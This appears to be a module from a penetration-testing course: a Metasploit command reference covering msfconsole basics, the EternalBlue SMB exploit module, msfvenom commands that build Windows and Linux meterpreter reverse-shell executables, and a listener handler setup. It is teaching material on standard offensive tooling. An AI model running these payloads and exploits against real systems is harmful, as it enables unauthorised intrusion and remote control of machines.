# Module 12: Metasploit Command Reference

### 1. msfconsole Basics
| Command | Description | Example |
| :--- | :--- | :--- |
| `search <term>` | Find a module | `search eternalblue` |
| `use <path>` | Select a module | `use exploit/windows/smb/ms17_010_eternalblue` |
| `show options` | See required settings | `show options` |
| `set <var> <val>` | Configure a setting | `set RHOSTS 192.168.1.10` |
| `exploit` or `run` | Launch the attack | `exploit` |
| `background` | Put session in background | `background` |

### 2. Essential Variables
- **RHOSTS**: Remote Host (The target's IP).
- **LHOST**: Local Host (Your Kali IP - where the shell connects back to).
- **LPORT**: Local Port (The port you are listening on, usually 4444).

### 3. msfvenom (Payload Generation)
**Formula**: `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>`

- **Create a Windows .exe reverse shell**:
  `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe`
- **Create a Linux .elf reverse shell**:
  `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf`

### 4. The Handler (Receiving the Connection)
If you use `msfvenom`, you need a listener to catch the shell:
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit
```
